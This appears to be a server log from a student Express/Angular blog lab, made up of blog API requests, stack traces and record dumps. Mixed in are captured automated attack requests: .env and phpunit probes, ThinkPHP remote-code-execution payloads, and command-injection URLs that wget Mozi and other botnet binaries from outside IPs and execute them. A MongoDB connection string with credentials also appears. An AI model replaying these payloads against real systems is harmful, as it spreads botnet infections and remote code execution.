    at new View (/home/bitnami/lab5/node_modules/express/lib/view.js:61:11)
    at Function.render (/home/bitnami/lab5/node_modules/express/lib/application.js:570:12)
    at ServerResponse.render (/home/bitnami/lab5/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/lab5/app.js:53:7
    at Layer.handle_error (/home/bitnami/lab5/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/lab5/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/lab5/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/lab5/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/lab5/node_modules/express/lib/router/index.js:275:10)
    at Layer.handle_error (/home/bitnami/lab5/node_modules/express/lib/router/layer.js:67:12)
    at trim_prefix (/home/bitnami/lab5/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/lab5/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/lab5/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/lab5/node_modules/express/lib/router/index.js:275:10)
    at /home/bitnami/lab5/node_modules/express/lib/response.js:435:7
    at onerror (/home/bitnami/lab5/node_modules/express/lib/response.js:1040:5)
HEAD /robots.txt 200 5646 - 0.511 ms
GET /.env 200 5646 - 0.764 ms
POST / 200 5646 - 2.280 ms
GET /boaform/admin/formLogin?username=user&psd=user 200 5646 - 0.776 ms
GET / 200 5646 - 0.764 ms
GET http://5.188.210.227/echo.php 200 5646 - 0.833 ms
GET / 200 5646 - 0.684 ms
GET / 200 5646 - 0.722 ms
GET / 200 5646 - 0.775 ms
GET / 200 5646 - 0.702 ms
HEAD /robots.txt 200 5646 - 0.488 ms
GET / 200 5646 - 0.705 ms
GET / 200 5646 - 0.703 ms
GET / 200 5646 - 1.329 ms
GET / 200 5646 - 0.704 ms
GET / 200 5646 - 1.280 ms
GET / 200 5646 - 0.757 ms
GET /manager/text/list 200 5646 - 0.684 ms
GET /.env 200 5646 - 0.709 ms
POST / 200 5646 - 0.927 ms
GET /wp-content/plugins/wp-file-manager/readme.txt 200 5646 - 0.731 ms
GET /solr/admin/info/system?wt=json 200 5646 - 0.705 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 5646 - 0.724 ms
GET / 200 5646 - 0.786 ms
GET /js/angular-route.min.js 200 5720 - 2.781 ms
GET /stylesheets/style.css 200 89 - 0.614 ms
GET /css/fontawesome-all.css 200 51609 - 1.807 ms
GET /js/bloggerApp.js 200 4802 - 2.099 ms
GET /css/bootstrap.min.css 200 160302 - 0.644 ms
GET /js/angular-ui-router.min.js 200 114858 - 1.762 ms
GET /js/angular.min.js 200 177245 - 3.016 ms
GET /favicon.ico 200 5646 - 0.811 ms
Getting blog list
[
  {
    _id: 5f920ae79feec0351d4d980e,
    blogTitle: 'This is a blog',
    blogText: 'cool!',
    createdOn: 2020-10-22T22:42:47.304Z,
    __v: 0
  },
  {
    _id: 5f920b407d3ee7355b5cad7f,
    blogTitle: 'Another blog',
    blogText: 'very cool!',
    createdOn: 2020-10-22T22:44:16.136Z,
    __v: 0
  },
  {
    _id: 5f920c297d3ee7355b5cad80,
    blogTitle: 'Testing',
    blogText: '1 2 3',
    createdOn: 2020-10-22T22:48:09.587Z,
    __v: 0
  }
]
GET /api/blogs 200 363 - 5.518 ms
GET /favicon.ico 304 - - 0.906 ms
GET /pages/blog-list.html 200 5646 - 1.099 ms
GET /webfonts/fa-solid-900.woff2 200 50372 - 0.657 ms
{
  _id: 5f920b407d3ee7355b5cad7f,
  blogTitle: 'Another blog',
  blogText: 'very cool!',
  createdOn: 2020-10-22T22:44:16.136Z,
  __v: 0
}
GET /api/blogs/5f920b407d3ee7355b5cad7f 200 132 - 2.472 ms
GET /favicon.ico 304 - - 0.422 ms
{
  _id: 5f920b407d3ee7355b5cad7f,
  blogTitle: 'Another blog',
  blogText: 'very cool!',
  createdOn: 2020-10-22T22:44:16.136Z,
  __v: 0
}
GET /api/blogs/5f920b407d3ee7355b5cad7f 304 - - 1.792 ms
Updating a blog entry with id of 5f920b407d3ee7355b5cad7f
PUT /api/blogs/5f920b407d3ee7355b5cad7f 201 132 - 2.537 ms
Getting blog list
GET /favicon.ico 304 - - 1.752 ms
[
  {
    _id: 5f920ae79feec0351d4d980e,
    blogTitle: 'This is a blog',
    blogText: 'cool!',
    createdOn: 2020-10-22T22:42:47.304Z,
    __v: 0
  },
  {
    _id: 5f920b407d3ee7355b5cad7f,
    blogTitle: 'Another blog!',
    blogText: 'very cool!!',
    createdOn: 2020-10-22T22:44:16.136Z,
    __v: 0
  },
  {
    _id: 5f920c297d3ee7355b5cad80,
    blogTitle: 'Testing',
    blogText: '1 2 3',
    createdOn: 2020-10-22T22:48:09.587Z,
    __v: 0
  }
]
GET /api/blogs 200 365 - 2.738 ms
{
  _id: 5f920b407d3ee7355b5cad7f,
  blogTitle: 'Another blog!',
  blogText: 'very cool!!',
  createdOn: 2020-10-22T22:44:16.136Z,
  __v: 0
}
GET /api/blogs/5f920b407d3ee7355b5cad7f 200 134 - 2.276 ms
GET /favicon.ico 304 - - 0.440 ms
{
  _id: 5f920b407d3ee7355b5cad7f,
  blogTitle: 'Another blog!',
  blogText: 'very cool!!',
  createdOn: 2020-10-22T22:44:16.136Z,
  __v: 0
}
GET /api/blogs/5f920b407d3ee7355b5cad7f 304 - - 1.734 ms
{
  _id: 5f920b407d3ee7355b5cad7f,
  blogTitle: 'Another blog!',
  blogText: 'very cool!!',
  createdOn: 2020-10-22T22:44:16.136Z,
  __v: 0
}
GET /api/blogs/5f920b407d3ee7355b5cad7f 304 - - 1.865 ms
Deleting blog entry with id of 5f920b407d3ee7355b5cad7f
{}
DELETE /api/blogs/5f920b407d3ee7355b5cad7f 204 - - 1.839 ms
Getting blog list
GET /favicon.ico 304 - - 1.634 ms
[
  {
    _id: 5f920ae79feec0351d4d980e,
    blogTitle: 'This is a blog',
    blogText: 'cool!',
    createdOn: 2020-10-22T22:42:47.304Z,
    __v: 0
  },
  {
    _id: 5f920c297d3ee7355b5cad80,
    blogTitle: 'Testing',
    blogText: '1 2 3',
    createdOn: 2020-10-22T22:48:09.587Z,
    __v: 0
  }
]
GET /api/blogs 200 238 - 2.475 ms
GET /favicon.ico 304 - - 0.547 ms
GET /favicon.ico 304 - - 0.559 ms
GET /js/bloggerApp.js 304 - - 0.579 ms
GET /favicon.ico 304 - - 0.498 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 5646 - 0.759 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 200 5646 - 0.699 ms
GET /manager/html 200 5646 - 0.731 ms
GET / 200 5646 - 0.664 ms
POST /api/jsonws/invoke 200 5646 - 0.828 ms
GET / 200 5646 - 0.690 ms
GET / 200 5646 - 0.755 ms
GET / 200 5646 - 0.738 ms
GET / 200 5646 - 0.729 ms
GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 200 5646 - 1.372 ms
POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 200 5646 - 0.833 ms
GET / 200 5646 - 0.741 ms
GET / 200 5646 - 0.712 ms
POST /HNAP1/ 200 5646 - 9.781 ms
GET / 200 5646 - 0.729 ms
GET / 200 5646 - 0.664 ms
GET / 200 5646 - 0.702 ms
GET / 200 5646 - 0.689 ms
POST /editBlackAndWhiteList - - - - ms
Error: No default engine was specified and no extension was provided.
    at new View (/home/bitnami/lab5/node_modules/express/lib/view.js:61:11)
    at Function.render (/home/bitnami/lab5/node_modules/express/lib/application.js:570:12)
    at ServerResponse.render (/home/bitnami/lab5/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/lab5/app.js:53:7
    at Layer.handle_error (/home/bitnami/lab5/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/lab5/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/lab5/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/lab5/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/lab5/node_modules/express/lib/router/index.js:275:10)
    at Layer.handle_error (/home/bitnami/lab5/node_modules/express/lib/router/layer.js:67:12)
    at trim_prefix (/home/bitnami/lab5/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/lab5/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/lab5/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/lab5/node_modules/express/lib/router/index.js:275:10)
    at /home/bitnami/lab5/node_modules/express/lib/response.js:435:7
    at onerror (/home/bitnami/lab5/node_modules/express/lib/response.js:1040:5)
GET / 200 5646 - 1.350 ms
POST /HNAP1/ 200 5646 - 3.009 ms
GET / 200 5646 - 2.069 ms
GET / 200 5646 - 0.712 ms
GET /.env 200 5646 - 0.773 ms
POST / 200 5646 - 0.826 ms
POST /editBlackAndWhiteList - - - - ms
Error: No default engine was specified and no extension was provided.
    at new View (/home/bitnami/lab5/node_modules/express/lib/view.js:61:11)
    at Function.render (/home/bitnami/lab5/node_modules/express/lib/application.js:570:12)
    at ServerResponse.render (/home/bitnami/lab5/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/lab5/app.js:53:7
    at Layer.handle_error (/home/bitnami/lab5/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/lab5/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/lab5/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/lab5/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/lab5/node_modules/express/lib/router/index.js:275:10)
    at Layer.handle_error (/home/bitnami/lab5/node_modules/express/lib/router/layer.js:67:12)
    at trim_prefix (/home/bitnami/lab5/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/lab5/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/lab5/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/lab5/node_modules/express/lib/router/index.js:275:10)
    at /home/bitnami/lab5/node_modules/express/lib/response.js:435:7
    at onerror (/home/bitnami/lab5/node_modules/express/lib/response.js:1040:5)
GET / 200 5646 - 1.244 ms
GET / 200 5646 - 4.018 ms
GET / 200 5646 - 0.682 ms
GET / 200 5646 - 0.767 ms
GET / 200 5646 - 2.376 ms
GET /.env 200 5646 - 0.749 ms
POST / 200 5646 - 0.758 ms
GET / 200 5646 - 0.717 ms
GET / 200 5646 - 0.531 ms
GET / 200 5646 - 0.787 ms
GET / 200 5646 - 0.728 ms
GET /wp-content/plugins/wp-file-manager/readme.txt 200 5646 - 0.679 ms
GET /solr/admin/info/system?wt=json 200 5646 - 0.670 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 5646 - 0.830 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 5646 - 0.719 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 200 5646 - 4.715 ms
GET / 200 5646 - 0.639 ms
OPTIONS / 200 5646 - 0.615 ms
GET / 200 5646 - 0.666 ms
GET / 200 5646 - 0.706 ms
GET / 200 5646 - 0.724 ms
POST /api/jsonws/invoke 200 5646 - 0.784 ms
GET /.env 200 5646 - 0.687 ms
POST / 200 5646 - 0.806 ms
GET / 200 5646 - 0.783 ms
GET / 200 5646 - 0.710 ms
POST /boaform/admin/formLogin 200 5646 - 0.777 ms
GET /shell?cd+/tmp;rm+-rf+*;wget+http://182.117.5.243:34266/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws 200 5646 - 0.688 ms
GET / 200 5646 - 0.667 ms
GET / 200 5646 - 0.709 ms
GET / 200 5646 - 0.686 ms
GET / 200 5646 - 0.667 ms
GET / 200 5646 - 0.683 ms
GET /phpmyadmin/ 200 5646 - 0.703 ms
GET / 200 5646 - 0.724 ms
GET / 200 5646 - 0.681 ms
GET / 200 5646 - 0.691 ms
GET / 200 5646 - 0.703 ms
HEAD /Ix5g 200 5646 - 0.545 ms
POST /boaform/admin/formLogin 200 5646 - 0.784 ms
POST /GponForm/diag_Form?images/ - - - - ms
Error: No default engine was specified and no extension was provided.
    at new View (/home/bitnami/lab5/node_modules/express/lib/view.js:61:11)
    at Function.render (/home/bitnami/lab5/node_modules/express/lib/application.js:570:12)
    at ServerResponse.render (/home/bitnami/lab5/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/lab5/app.js:53:7
    at Layer.handle_error (/home/bitnami/lab5/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/lab5/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/lab5/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/lab5/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/lab5/node_modules/express/lib/router/index.js:275:10)
    at Layer.handle_error (/home/bitnami/lab5/node_modules/express/lib/router/layer.js:67:12)
    at trim_prefix (/home/bitnami/lab5/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/lab5/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/lab5/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/lab5/node_modules/express/lib/router/index.js:275:10)
    at /home/bitnami/lab5/node_modules/express/lib/response.js:435:7
    at onerror (/home/bitnami/lab5/node_modules/express/lib/response.js:1040:5)
GET /wp-content/plugins/wp-file-manager/readme.txt 200 5646 - 0.664 ms
GET /solr/admin/info/system?wt=json 200 5646 - 0.696 ms
GET / 200 5646 - 0.680 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 5646 - 0.652 ms
GET / 200 5646 - 0.671 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 5646 - 1.417 ms
GET / 200 5646 - 0.798 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 200 5646 - 0.684 ms
GET / 200 5646 - 0.682 ms
GET / 200 5646 - 0.664 ms
GET /hudson 200 5646 - 0.714 ms
GET / 200 5646 - 0.733 ms
GET / 200 5646 - 0.662 ms
GET / 200 5646 - 0.746 ms
GET / 200 5646 - 0.760 ms
GET / 200 5646 - 0.712 ms
POST /api/jsonws/invoke 200 5646 - 0.727 ms
GET / 200 5646 - 0.671 ms
GET /boaform/admin/formLogin?username=user&psd=user 200 5646 - 0.699 ms
GET /_fragment 200 5646 - 0.769 ms
GET /shell?cd+/tmp;rm+-rf+*;wget+149.3.170.181/bins/uza;chmod+777+/tmp/uza;sh+/tmp/uza+BeastMode.Rep.Jaws 200 5646 - 0.765 ms
GET / 200 5646 - 0.709 ms
GET / 200 5646 - 0.657 ms
GET / 200 5646 - 0.649 ms
GET / 200 5646 - 4.941 ms
GET /favicon.ico 200 5646 - 0.716 ms
GET /phpmyadmin/ 200 5646 - 0.731 ms
GET / 200 5646 - 0.724 ms
GET /.env 200 5646 - 0.757 ms
POST / 200 5646 - 0.819 ms
GET / 200 5646 - 0.661 ms
GET / 200 5646 - 0.673 ms
GET / 200 5646 - 0.707 ms
GET /config/getuser?index=0 200 5646 - 0.665 ms
GET / 200 5646 - 0.710 ms
GET / 200 5646 - 0.667 ms
GET / 200 5646 - 0.703 ms
GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws 200 5646 - 0.683 ms
GET / 200 5646 - 0.684 ms
GET / 200 5646 - 0.677 ms
GET / 200 5646 - 0.736 ms
GET / 200 5646 - 0.698 ms
GET /portal/redlion 200 5646 - 0.699 ms
GET / 200 5646 - 0.716 ms
GET /TP/public/index.php 200 5646 - 0.743 ms
GET /TP/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 200 5646 - 0.673 ms
POST /TP/public/index.php?s=captcha 200 5646 - 0.773 ms
GET / 200 5646 - 0.720 ms
GET / 200 5646 - 1.413 ms
GET / 200 5646 - 1.127 ms
GET / 200 5646 - 0.649 ms
GET / 200 5646 - 0.777 ms
GET / 200 5646 - 0.708 ms
GET / 200 5646 - 0.702 ms
GET / 200 5646 - 0.729 ms
GET / 200 5646 - 1.768 ms
GET / 200 5646 - 0.711 ms
GET / 200 5646 - 0.714 ms
GET / 200 5646 - 0.708 ms
GET / 200 5646 - 0.690 ms
GET /.env 200 5646 - 0.678 ms
GET / 200 5646 - 0.768 ms
GET / 200 5646 - 0.662 ms
HEAD / 200 5646 - 0.489 ms
GET / 200 5646 - 0.732 ms
GET / 200 5646 - 0.667 ms
GET / 200 5646 - 1.266 ms
GET / 200 5646 - 0.680 ms
GET / 200 5646 - 0.530 ms
GET / 200 5646 - 0.713 ms
GET / 200 5646 - 0.718 ms
GET / 200 5646 - 0.677 ms
GET / 200 5646 - 0.530 ms
GET / 200 5646 - 0.679 ms
GET / 200 5646 - 0.648 ms
GET / 200 5646 - 0.731 ms
GET / 200 5646 - 0.950 ms
GET / 200 5646 - 0.697 ms
GET / 200 5646 - 1.681 ms
GET /phpmyadmin/ 200 5646 - 0.696 ms
GET / 200 5646 - 0.940 ms
GET / 200 5646 - 0.778 ms
GET / 200 5646 - 0.721 ms
GET /hudson 200 5646 - 0.784 ms
GET / 200 5646 - 0.648 ms
GET / 200 5646 - 0.792 ms
GET / 200 5646 - 0.712 ms
GET / 200 5646 - 0.675 ms
GET / 200 5646 - 0.705 ms
GET / 200 5646 - 0.749 ms
GET /.env 200 5646 - 1.558 ms
POST / 200 5646 - 2.973 ms
GET / 200 5646 - 0.656 ms
GET / 200 5646 - 0.698 ms
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.119.207.10:59634/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 200 5646 - 0.747 ms
GET /shell?cd+/tmp;rm+-rf+*;wget+149.3.170.181/bins/uza;chmod+777+/tmp/uza;sh+/tmp/uza+BeastMode.Rep.Jaws - - - - ms
GET / 200 5646 - 0.773 ms
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://120.56.118.219:55564/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 200 5646 - 1.374 ms
POST /GponForm/diag_Form?images/ - - - - ms
Error: No default engine was specified and no extension was provided.
    at new View (/home/bitnami/lab5/node_modules/express/lib/view.js:61:11)
    at Function.render (/home/bitnami/lab5/node_modules/express/lib/application.js:570:12)
    at ServerResponse.render (/home/bitnami/lab5/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/lab5/app.js:53:7
    at Layer.handle_error (/home/bitnami/lab5/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/lab5/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/lab5/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/lab5/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/lab5/node_modules/express/lib/router/index.js:275:10)
    at Layer.handle_error (/home/bitnami/lab5/node_modules/express/lib/router/layer.js:67:12)
    at trim_prefix (/home/bitnami/lab5/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/lab5/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/lab5/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/lab5/node_modules/express/lib/router/index.js:275:10)
    at /home/bitnami/lab5/node_modules/express/lib/response.js:435:7
    at onerror (/home/bitnami/lab5/node_modules/express/lib/response.js:1040:5)
GET / 200 5646 - 0.695 ms
GET / 200 5646 - 0.951 ms
GET / 200 5646 - 0.704 ms
GET /.env 200 5646 - 3.300 ms
POST / 200 5646 - 0.838 ms
GET /.env 200 5646 - 0.726 ms
GET / 200 5646 - 1.816 ms
GET / 200 5646 - 0.697 ms
GET /.env 200 5646 - 0.661 ms
POST / 200 5646 - 0.791 ms
GET / 200 5646 - 0.686 ms
GET /wp-content/plugins/wp-file-manager/readme.txt 200 5646 - 0.711 ms
GET /solr/admin/info/system?wt=json 200 5646 - 0.716 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 5646 - 0.655 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 5646 - 0.657 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 200 5646 - 0.642 ms
GET / 200 5646 - 0.724 ms
POST /api/jsonws/invoke 200 5646 - 0.753 ms
GET / 200 5646 - 0.692 ms
GET / 200 5646 - 0.756 ms
GET / 200 5646 - 0.644 ms
GET / 200 5646 - 0.708 ms
GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 200 5646 - 0.729 ms
POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 200 5646 - 0.796 ms
GET / 200 5646 - 0.699 ms
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://119.167.26.139:44263/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 200 5646 - 0.765 ms
GET / 200 5646 - 1.317 ms
GET / 200 5646 - 0.789 ms
GET / 200 5646 - 0.697 ms
GET / 200 5646 - 0.694 ms
GET / 200 5646 - 0.752 ms
POST /boaform/admin/formLogin 200 5646 - 0.792 ms
GET / 200 5646 - 0.681 ms
GET / 200 5646 - 0.699 ms
GET / 200 5646 - 0.785 ms
GET / 200 5646 - 0.644 ms
GET / 200 5646 - 0.743 ms
POST /boaform/admin/formLogin 200 5646 - 0.806 ms
GET /ReportServer 200 5646 - 0.656 ms
GET / 200 5646 - 0.696 ms
GET / 200 5646 - 1.625 ms
GET / 200 5646 - 0.736 ms
GET / 200 5646 - 0.748 ms
GET / 200 5646 - 1.331 ms
GET / 200 5646 - 0.748 ms
GET / 200 5646 - 0.712 ms
GET /portal/redlion 200 5646 - 0.674 ms
GET /.env 200 5646 - 0.721 ms
POST / 200 5646 - 0.845 ms
GET / 200 5646 - 0.715 ms
GET / 200 5646 - 0.638 ms
GET / 200 5646 - 0.694 ms
GET /.env 200 5646 - 0.671 ms
POST / 200 5646 - 0.780 ms
(node:2722) DeprecationWarning: current URL string parser is deprecated, and will be removed in a future version. To use the new parser, pass option { useNewUrlParser: true } to MongoClient.connect.
(node:2722) DeprecationWarning: current Server Discovery and Monitoring engine is deprecated, and will be removed in a future version. To use the new Server Discover and Monitoring engine, pass option { useUnifiedTopology: true } to the MongoClient constructor.
Mongoose connected to mongodb://blogs:blogs@localhost/blogger
GET / 304 - - 5.251 ms
GET /js/angular.min.js 304 - - 1.044 ms
GET /css/bootstrap.min.css 304 - - 0.975 ms
GET /stylesheets/style.css 304 - - 0.353 ms
GET /css/fontawesome-all.css 304 - - 0.618 ms
GET /js/angular-route.min.js 304 - - 0.597 ms
GET /js/angular-ui-router.min.js 304 - - 0.597 ms
GET /js/bloggerApp.js 304 - - 1.009 ms
GET /js/auth/authentication.js 304 - - 1.336 ms
GET /js/nav/navigation.js 304 - - 0.706 ms
GET /js/angular.min.js.map 304 - - 1.078 ms
GET /js/angular-route.min.js.map 304 - - 0.999 ms
GET /js/angular-ui-router.min.js.map 304 - - 0.997 ms
GET /css/bootstrap.min.css.map 304 - - 0.480 ms
GET /js/nav/navigation.html 304 - - 0.679 ms
Getting blog list
[
  {
    _id: 5f920ae79feec0351d4d980e,
    blogTitle: 'This is a blog',
    blogText: 'cool! I edited.',
    createdOn: 2020-10-22T22:42:47.304Z,
    __v: 0
  },
  {
    _id: 5f9b084d9477e92caa648117,
    blogTitle: "I'm logged in now!",
    blogText: '',
    createdOn: 2020-10-29T18:22:05.092Z,
    __v: 0
  }
]
GET /api/blogs 304 - - 20.982 ms
GET /pages/blog-list.html 304 - - 14.195 ms
GET /favicon.ico 200 5396 - 2.528 ms
GET /js/auth/login.html 304 - - 0.823 ms
GET /favicon.ico 304 - - 0.508 ms
POST /api/login 200 241 - 26.571 ms
GET /favicon.ico 304 - - 0.833 ms
Getting blog list
[
  {
    _id: 5f920ae79feec0351d4d980e,
    blogTitle: 'This is a blog',
    blogText: 'cool! I edited.',
    createdOn: 2020-10-22T22:42:47.304Z,
    __v: 0
  },
  {
    _id: 5f9b084d9477e92caa648117,
    blogTitle: "I'm logged in now!",
    blogText: '',
    createdOn: 2020-10-29T18:22:05.092Z,
    __v: 0
  }
]
GET /api/blogs 304 - - 4.519 ms
GET /favicon.ico 304 - - 0.685 ms
GET / 304 - - 0.677 ms
GET /js/angular.min.js 304 - - 0.778 ms
GET /stylesheets/style.css 304 - - 0.454 ms
GET /css/bootstrap.min.css 304 - - 0.483 ms
GET /css/fontawesome-all.css 304 - - 0.595 ms
GET /js/angular-route.min.js 304 - - 0.867 ms
GET /js/auth/authentication.js 304 - - 1.691 ms
GET /js/angular-ui-router.min.js 304 - - 0.597 ms
GET /js/bloggerApp.js 304 - - 0.515 ms
GET /js/nav/navigation.js 304 - - 0.661 ms
GET /js/angular.min.js.map 304 - - 0.929 ms
GET /js/angular-route.min.js.map 304 - - 0.956 ms
GET /js/angular-ui-router.min.js.map 304 - - 1.005 ms
GET /css/bootstrap.min.css.map 304 - - 0.537 ms
GET /js/nav/navigation.html 304 - - 0.852 ms
GET /favicon.ico 304 - - 0.629 ms
